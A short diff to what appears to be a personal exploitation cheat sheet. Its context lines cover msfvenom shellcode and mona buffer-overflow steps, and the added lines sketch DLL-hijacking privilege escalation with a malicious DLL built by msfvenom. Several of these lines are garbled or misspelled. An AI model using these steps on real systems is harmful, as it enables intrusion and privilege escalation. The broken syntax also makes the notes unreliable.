@@ -87,3 +87,9 @@ msfvenom -p linux/x86/exec CMD=ifconfig -b '\x00' -f python
 !mona modules
 !mona jmp -r esp -m
 /.hidden/inventory.exe <<<$(./mybuff.py)
+
+# priv escalation 
+procmon
+crl L
+path containt dll
+-p windows/exec CMD='cmd.exe /C "whoami" > C:\ p\whami.txt' -f dll > sspiclr dll
